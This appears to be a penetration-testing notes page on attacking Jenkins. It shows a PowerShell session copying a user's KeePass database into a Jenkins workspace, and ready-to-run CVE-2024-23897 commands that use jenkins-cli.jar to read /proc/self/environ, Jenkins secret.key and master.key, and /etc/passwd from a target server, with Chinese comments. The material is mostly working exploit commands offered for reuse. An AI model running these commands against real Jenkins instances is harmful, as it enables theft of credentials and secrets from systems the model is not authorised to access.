### File Transfer
```
PS C:\Users\Administrator\.jenkins\workspace\0xdf> copy \users\kohsuke\Documents\CEH.kdbx .
PS C:\Users\Administrator\.jenkins\workspace\0xdf> ls


    Directory: C:\Users\Administrator\.jenkins\workspace\0xdf


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        9/18/2017   1:43 PM           2846 CEH.kdbx  
```
![image](https://github.com/user-attachments/assets/314590f5-7dcb-4f7d-bd2b-10914578d8f3)
### Command Execution
https://juejin.cn/post/7024025078396370975
### CVE-2024-23897
Download jenkins-cli.jar: jenkins-url/jnlpJars/jenkins-cli.jar
```
JENKINS_HOME=/var/jenkins_home
java -jar jenkins-cli.jar -s http://172.16.1.19:8080/ -http help 1 "@/proc/self/environ"    //看文件目标路径
java -jar jenkins-cli.jar -s http://172.16.1.19:8080/ -http help 1 "@/var/jenkins_home/secret.key"  //读取密钥
java -jar jenkins-cli.jar -s http://172.16.1.19:8080/ -http help 1 "@/var/jenkins_home/secrets/master.key"  //查看加密内容
java -jar jenkins-cli.jar -s http://172.16.1.19:8080/ -http connect-node "@/etc/passwd"
```
